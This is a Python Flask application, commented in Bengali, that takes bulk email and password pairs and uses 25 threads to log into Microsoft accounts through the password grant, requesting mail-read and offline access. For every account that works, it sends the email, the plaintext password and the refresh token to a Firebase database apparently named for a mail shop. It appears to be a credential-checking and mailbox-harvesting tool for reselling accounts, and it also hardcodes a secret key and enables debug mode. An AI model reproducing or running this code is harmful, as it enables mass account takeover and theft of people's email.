import os
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template, request

# Root folder (..) থেকে HTML পড়ার জন্য নিখুঁত কনফিগারেশন
app = Flask(__name__, template_folder='../', static_folder='../')
app.secret_key = "emon_secret_key_2026"

DEFAULT_GRAPH_CLIENT = "b263ec40-a044-4998-baaf-59e6472410db"
FIREBASE_REST_URL = "https://mail-shop-bd-default-rtdb.firebaseio.com"

def process_single_account(account_pair):
    email, password = account_pair
    token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    data = {
        "client_id": DEFAULT_GRAPH_CLIENT,
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "https://graph.microsoft.com/Mail.Read offline_access openid profile"
    }
    
    try:
        # Microsoft API কল
        response = requests.post(token_url, data=data, headers=headers, timeout=8)
        res_data = response.json()
        
        if "refresh_token" in res_data:
            refresh_token = res_data["refresh_token"]
            
            # আপনার চাহিদা অনুযায়ী তৈরি করা ফরম্যাট: user|pass|refresh_token|client_id
            formatted_value = f"{email}|{password}|{refresh_token}|{DEFAULT_GRAPH_CLIENT}"
            
            # রিভার্স টাইমস্ট্যাম্প ব্যবহার করায় নতুন ডাটা সবসময় নোডে সবার উপরে সেভ হবে
            reverse_timestamp = str(9999999999999 - int(time.time() * 1000))
            
            fb_url = f"{FIREBASE_REST_URL}/graph_tokens/{reverse_timestamp}.json"
            payload = {
                "account_data": formatted_value,
                "email": email,
                "timestamp": time.time()
            }
            
            fb_res = requests.put(fb_url, json=payload, timeout=5)
            
            if fb_res.status_code in [200, 201]:
                return {"email": email, "status": True, "saved_text": formatted_value}
            else:
                return {"email": email, "status": False, "error": f"Firebase Error Code: {fb_res.status_code}"}
        else:
            error_msg = res_data.get("error_description", "Unknown Error").split("Trace ID")[0].strip()
            return {"email": email, "status": False, "error": error_msg}
            
    except Exception as e:
        return {"email": email, "status": False, "error": str(e)}

@app.route('/', methods=['GET'])
@app.route('/graph-token.html', methods=['GET'])
def index():
    return render_template('graph-token.html')

@app.route('/process-bulk', methods=['POST'])
def process_bulk():
    raw_data = request.form.get('bulk_data', '').strip()
    lines = raw_data.split('\n')
    
    account_list = []
    for line in lines:
        line = line.strip()
        if "|" in line:
            parts = [p.strip() for p in line.split('|')]
            if len(parts) >= 2:
                account_list.append((parts[0], parts[1]))

    if not account_list:
        return render_template('graph-token.html', results=[{"email": "None", "status": False, "error": "No valid data provided!"}])

    # ১০০টি রিকোয়েস্ট দ্রুত প্রসেস করার জন্য ২৫টি থ্রেড
    results = []
    with ThreadPoolExecutor(max_workers=25) as executor:
        results = list(executor.map(process_single_account, account_list))
            
    return render_template('graph-token.html', results=results)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5001, debug=True)
